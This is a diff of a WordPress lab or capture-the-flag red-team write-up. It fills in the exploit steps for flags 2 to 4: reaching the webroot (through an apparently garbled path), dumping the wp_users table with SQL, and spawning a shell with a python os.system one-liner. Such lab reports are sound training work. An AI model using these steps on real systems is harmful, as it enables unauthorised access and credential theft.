@@ -54,8 +54,8 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
   - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a36e581c
  
     - **Exploit Used**
-      - _TODO: Identify the exploit used_
-      - _TODO: Include the command run_
+      - Navigated to webroot without being a privileged user
+      - Command used: cd /www/var
  
  
  <img src="https://github.com/edwardhough/wordpress-vuln/blob/main/images/image5.png" width=75% height=75%>
@@ -64,8 +64,8 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
   - `flag3.txt`: afc01ab56b50591e7dccf93122770cd2
 
     - **Exploit Used**
-      - _TODO: Identify the exploit used_
-      - _TODO: Include the command run_
+      - Able to access user table in mySQL database
+      - Command used: SELECT * FROM wp_users;
 
 
 <img src="https://github.com/edwardhough/wordpress-vuln/blob/main/images/image2.png" width=75% height=75%>
@@ -74,8 +74,8 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
   - `flag4.txt`: 715dea6c055b9fe3337544932f2941ce
  
     - **Exploit Used**
-      - _TODO: Identify the exploit used_
-      - _TODO: Include the command run_
+      - Spawning root shell from python command
+      - Command used: python -c 'import os; os.system("/bin/sh")'
 
 
 <img src="https://github.com/edwardhough/wordpress-vuln/blob/main/images/image%2020.png" width=75% height=75%>
